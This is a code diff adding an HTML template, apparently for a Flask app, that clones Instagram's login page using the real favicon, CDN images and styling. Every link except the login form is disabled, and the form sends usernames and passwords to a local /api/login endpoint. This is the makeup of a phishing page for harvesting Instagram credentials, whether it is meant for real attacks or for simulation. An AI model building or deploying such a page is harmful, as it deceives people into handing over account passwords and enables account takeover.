@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Instagram</title>
+    <link rel="icon" href="https://www.instagram.com/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    <style>
+        body.instagram {
+            background: #fafafa;
+        }
+        .ig-wrapper {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .ig-phone {
+            display: none;
+            margin-right: 32px;
+        }
+        @media (min-width: 876px) {
+            .ig-phone {
+                display: block;
+            }
+        }
+        .ig-phone img {
+            height: 618px;
+        }
+        .ig-main {
+            width: 100%;
+            max-width: 350px;
+        }
+        .ig-box {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 40px 40px 20px;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+        .ig-logo {
+            font-family: 'Billabong', 'Segoe Script', 'Grand Hotel', cursive;
+            font-size: 48px;
+            margin-bottom: 30px;
+            color: #262626;
+        }
+        .ig-input {
+            width: 100%;
+            padding: 9px 8px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 12px;
+            outline: none;
+            margin-bottom: 6px;
+            color: #262626;
+        }
+        .ig-input:focus {
+            border-color: #a8a8a8;
+        }
+        .ig-input::placeholder {
+            color: #8e8e8e;
+            font-size: 12px;
+        }
+        .ig-btn {
+            width: 100%;
+            padding: 7px 16px;
+            background: #0095f6;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 14px;
+            transition: all 0.2s ease;
+        }
+        .ig-btn:hover:not(:disabled) {
+            background: #1877f2;
+        }
+        .ig-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+        .ig-divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        .ig-divider::before,
+        .ig-divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+        .ig-divider span {
+            padding: 0 18px;
+        }
+        .ig-fb {
+            color: #385185;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 15px;
+        }
+        .ig-fb:hover {
+            color: #385185;
+        }
+        .ig-fb-icon {
+            width: 16px;
+            height: 16px;
+            background: #385185;
+            border-radius: 2px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-size: 10px;
+            font-weight: 700;
+        }
+        .ig-forgot {
+            color: #00376b;
+            font-size: 12px;
+            text-decoration: none;
+        }
+        .ig-forgot:hover {
+            color: #00376b;
+        }
+        .ig-signup {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+        .ig-signup span {
+            color: #262626;
+        }
+        .ig-signup a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .ig-app {
+            text-align: center;
+            margin-top: 10px;
+        }
+        .ig-app p {
+            font-size: 14px;
+            color: #262626;
+            margin-bottom: 15px;
+        }
+        .ig-app-btns {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+        }
+        .ig-app-btns img {
+            height: 40px;
+        }
+        .ig-error {
+            background: rgba(237, 73, 86, 0.05);
+            border: 1px solid rgba(237, 73, 86, 0.2);
+            color: #ed4956;
+            padding: 10px;
+            border-radius: 4px;
+            font-size: 13px;
+            margin-bottom: 10px;
+            display: none;
+            text-align: center;
+        }
+        .ig-loader {
+            display: none;
+            text-align: center;
+            padding: 10px 0;
+        }
+        .ig-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #dbdbdb;
+            border-top-color: #262626;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body class="instagram">
+    
+    <div class="ig-wrapper">
+        <!-- Phone Image (Desktop) -->
+        <div class="ig-phone">
+            <img src="https://static.cdninstagram.com/images/instagram/xig/homepage/phones/home-phones.png" 
+                 alt="Instagram App" 
+                 style="height: 618px;">
+        </div>
+        
+        <!-- Main Content -->
+        <div class="ig-main">
+            <!-- Login Box -->
+            <div class="ig-box">
+                <div class="ig-logo">Instagram</div>
+                
+                <div id="login-error" class="ig-error"></div>
+                
+                <form id="login-form" method="POST" action="/api/login">
+                    <input type="text" 
+                           id="username" 
+                           name="username" 
+                           class="ig-input" 
+                           placeholder="Phone number, username, or email" 
+                           autocomplete="username"
+                           required>
+                    
+                    <input type="password" 
+                           id="password" 
+                           name="password" 
+                           class="ig-input" 
+                           placeholder="Password" 
+                           autocomplete="current-password"
+                           required>
+                    
+                    <button type="submit" id="login-submit" class="ig-btn">Log in</button>
+                </form>
+                
+                <div id="login-loader" class="ig-loader">
+                    <div class="ig-spinner"></div>
+                </div>
+                
+                <div class="ig-divider"><span>OR</span></div>
+                
+                <a href="#" class="ig-fb" onclick="return false;">
+                    <span class="ig-fb-icon">f</span>
+                    Log in with Facebook
+                </a>
+                
+                <a href="#" class="ig-forgot" onclick="return false;">Forgot password?</a>
+            </div>
+            
+            <!-- Signup Box -->
+            <div class="ig-signup">
+                <span>Don't have an account? </span>
+                <a href="#" onclick="return false;">Sign up</a>
+            </div>
+            
+            <!-- App Download -->
+            <div class="ig-app">
+                <p>Get the app.</p>
+                <div class="ig-app-btns">
+                    <a href="#" onclick="return false;">
+                        <img src="https://static.cdninstagram.com/images/instagram/xig/homepage/download-buttons/app-store.png" 
+                             alt="Download on the App Store">
+                    </a>
+                    <a href="#" onclick="return false;">
+                        <img src="https://static.cdninstagram.com/images/instagram/xig/homepage/download-buttons/google-play.png" 
+                             alt="Get it on Google Play">
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script src="{{ url_for('static', filename='js/main.js') }}"></script>
+</body>
+</html>
